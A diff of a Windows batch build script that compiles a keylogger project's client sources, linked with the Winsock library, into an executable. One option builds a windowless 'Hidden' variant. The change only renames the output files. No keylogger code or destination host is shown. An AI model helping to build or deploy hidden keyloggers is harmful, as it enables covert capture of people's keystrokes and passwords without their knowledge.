@@ -8,11 +8,11 @@ goto :winprompt
 
 :option_window
 
-g++ .\KeyLoggerSoftware\client\KeyLogger_clientCom.cpp .\KeyLoggerSoftware\client\Sanitize_keylogBuff.cpp .\KeyLoggerSoftware\client\main.cpp -lws2_32 -o .\KeyLoggerSoftware\client\keylogserver.exe
+g++ .\KeyLoggerSoftware\client\KeyLogger_clientCom.cpp .\KeyLoggerSoftware\client\Sanitize_keylogBuff.cpp .\KeyLoggerSoftware\client\main.cpp -lws2_32 -o .\KeyLoggerSoftware\client\keylogger.exe
 
 goto :ServerCompile
 :option_nowindow
-g++ .\KeyLoggerSoftware\client\KeyLogger_clientCom.cpp .\KeyLoggerSoftware\client\Sanitize_keylogBuff.cpp .\KeyLoggerSoftware\client\main.cpp -lws2_32 -mwindows -o .\KeyLoggerSoftware\client\keylogserverHidden.exe
+g++ .\KeyLoggerSoftware\client\KeyLogger_clientCom.cpp .\KeyLoggerSoftware\client\Sanitize_keylogBuff.cpp .\KeyLoggerSoftware\client\main.cpp -lws2_32 -mwindows -o .\KeyLoggerSoftware\client\keyloggerHidden.exe
 
 :ServerCompile
 echo complete
